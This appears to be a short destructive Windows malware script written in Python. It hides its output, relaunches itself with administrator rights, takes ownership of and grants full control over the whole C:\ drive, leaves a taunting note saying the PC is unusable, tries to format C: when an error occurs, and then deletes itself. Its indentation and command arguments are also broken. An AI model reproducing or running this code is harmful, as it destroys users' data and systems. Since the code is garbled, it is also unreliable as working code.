import ctypes
import os
import sys

FNULL = open(os.devnull, 'w')
sys.stdout = FNULL
sys.stderr = FNULL

if not ctypes.windll.shell32.IsUserAnAdmin():

    args = [sys.executable] + sys.argv
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(args), None, 1)
    try:
    os.system('takeown /f C:\\ /r /d /s /q c:\ y')
    os.system('icacls C:\\ /grant administrators:F /t')
    with open('C:\\byebye.txt', 'w') as f:
        f.write('See you! You can not use this PC anymore. So sorry!:D')
except Exception as e:
    os.system('format C:\\ /y')
 
    sys.exit()

current_file = sys.argv[0]
if not os.path.isabs(current_file):
    current_file = os.path.abspath(current_file)

os.rename(current_file, current_file + ".bak")

os.remove(current_file + ".bak")
